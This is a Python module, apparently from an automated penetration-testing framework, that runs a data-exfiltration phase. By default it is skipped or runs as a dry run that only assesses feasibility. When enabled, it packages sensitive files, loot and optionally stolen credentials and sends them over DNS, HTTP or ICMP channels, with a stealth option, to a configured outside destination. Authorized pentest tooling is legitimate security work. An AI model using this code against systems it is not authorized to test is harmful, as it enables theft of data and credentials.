#!/usr/bin/env python3
"""
phases/exfiltrate.py - 数据外泄阶段执行器

负责数据外泄可行性评估（默认dry_run模式）。

安全警告: 此阶段仅用于授权渗透测试中验证数据外泄可行性。
默认情况下此阶段被跳过 (skip_exfiltrate=True)。
"""

import json
import logging
from typing import TYPE_CHECKING, Any, Dict, List

from .base import BasePhaseExecutor, PhaseResult

logger = logging.getLogger(__name__)


class ExfiltratePhaseExecutor(BasePhaseExecutor):
    """数据外泄阶段执行器

    配置项:
        skip_exfiltrate (bool): 是否跳过此阶段，默认True
        exfil_methods (list): 允许的外泄方法 ['dns', 'http', 'icmp']
        dry_run (bool): 仅模拟，不实际外泄数据，默认True
    """

    name = "exfiltrate"
    description = "数据外泄"

    @property
    def phase(self):
        from ..state import PentestPhase

        return PentestPhase.EXFILTRATE

    @property
    def required_phases(self):
        from ..state import PentestPhase

        return (PentestPhase.LATERAL_MOVE,)

    async def execute(self) -> PhaseResult:
        from ..state import PentestPhase

        errors: List[str] = []
        findings: List[Dict[str, Any]] = []

        skip_exfiltrate = self.config.get("skip_exfiltrate", True)
        if skip_exfiltrate:
            return PhaseResult(
                success=True,
                phase=PentestPhase.EXFILTRATE,
                data={"skipped": True, "reason": "配置中设置跳过 (skip_exfiltrate=True)"},
                findings=[],
                errors=[],
            )

        sensitive_data = self.state.recon_data.get("sensitive_files", [])
        credentials = getattr(self.state, "credentials", None)
        loot = getattr(self.state, "loot", None) or []

        if not sensitive_data and not credentials and not loot:
            return PhaseResult(
                success=True,
                phase=PentestPhase.EXFILTRATE,
                data={"skipped": True, "reason": "无敏感数据可外泄"},
                findings=[],
                errors=[],
            )

        dry_run = self.config.get("dry_run", True)
        include_credentials = self.config.get("exfil_include_credentials", False)

        exfil_assessment = {
            "sensitive_files_count": len(sensitive_data),
            "credentials_count": len(credentials) if credentials else 0,
            "loot_count": len(loot),
            "exfil_feasible": bool(sensitive_data or credentials or loot),
            "dry_run": dry_run,
        }

        if exfil_assessment["exfil_feasible"]:
            findings.append(
                {
                    "type": "data_exfiltration_risk",
                    "severity": "high",
                    "title": "数据外泄风险",
                    "description": f"发现 {exfil_assessment['sensitive_files_count']} 个敏感文件、"
                    f"{exfil_assessment['credentials_count']} 组凭证、"
                    f"{exfil_assessment['loot_count']} 份敏感数据可能被外泄",
                    "phase": "exfiltrate",
                }
            )

        if dry_run:
            exfil_assessment["note"] = "dry_run=True，仅评估外泄可行性，未实际执行数据外泄"
            return PhaseResult(
                success=True,
                phase=PentestPhase.EXFILTRATE,
                data=exfil_assessment,
                findings=findings,
                errors=errors,
            )

        try:
            from core.exfiltration import ExfilChannel, ExfilConfig, ExfilFactory

            channel = self.config.get("exfil_channel")
            if not channel:
                methods = self.config.get("exfil_methods") or []
                channel = methods[0] if methods else "https"

            destination = (
                self.config.get("exfil_destination") or self.config.get("destination") or ""
            )
            if not destination:
                return PhaseResult(
                    success=False,
                    phase=PentestPhase.EXFILTRATE,
                    data={"error": "缺少 exfil_destination 配置"},
                    findings=findings,
                    errors=["缺少 exfil_destination 配置"],
                )

            payload = {
                "session_id": self.state.session_id,
                "target": self.state.target,
                "sensitive_files": sensitive_data,
                "loot": self.state.loot,
            }
            if include_credentials:
                payload["credentials"] = credentials

            data_bytes = json.dumps(payload, ensure_ascii=True, default=str).encode("utf-8")

            config = ExfilConfig(
                channel=ExfilChannel(channel),
                destination=destination,
                encryption=bool(self.config.get("encryption", True)),
                chunk_size=self._clamp_config_int("chunk_size", 4096, 512, 65536),
                rate_limit=float(self.config.get("rate_limit", 0.0)),
                timeout=float(self.config.get("timeout", 30.0)),
                stealth=bool(self.config.get("stealth", False)),
                proxy=self.config.get("proxy"),
                dns_domain=self.config.get("exfil_dns_domain")
                or self.config.get("dns_domain")
                or "",
                dns_subdomain_length=self._clamp_config_int("dns_subdomain_length", 63, 1, 63),
                nameserver=self.config.get("exfil_nameserver") or self.config.get("nameserver"),
            )

            module = ExfilFactory.create(config)
            result = module.exfiltrate(data_bytes)

            data = result.to_dict()
            data.update(
                {
                    "payload_size": len(data_bytes),
                    "channel": channel,
                    "destination": destination,
                }
            )

            if result.success:
                findings.append(
                    {
                        "type": "data_exfiltration",
                        "severity": "critical",
                        "title": f"数据外泄成功 ({channel})",
                        "description": f"成功外泄 {len(data_bytes)} bytes 数据",
                        "phase": "exfiltrate",
                    }
                )

            return PhaseResult(
                success=result.success,
                phase=PentestPhase.EXFILTRATE,
                data=data,
                findings=findings,
                errors=errors,
            )

        except ImportError as e:
            errors.append(f"模块导入失败: {e}")
            self.logger.exception(f"数据外泄模块导入失败: {e}")
            return PhaseResult(
                success=False,
                phase=PentestPhase.EXFILTRATE,
                data={"error": str(e)},
                findings=findings,
                errors=errors,
            )
        except (OSError, ConnectionError, ValueError) as e:
            errors.append(str(e))
            self.logger.exception(f"数据外泄阶段失败: {e}")
            return PhaseResult(
                success=False,
                phase=PentestPhase.EXFILTRATE,
                data={"error": str(e)},
                findings=findings,
                errors=errors,
            )


__all__ = ["ExfiltratePhaseExecutor"]
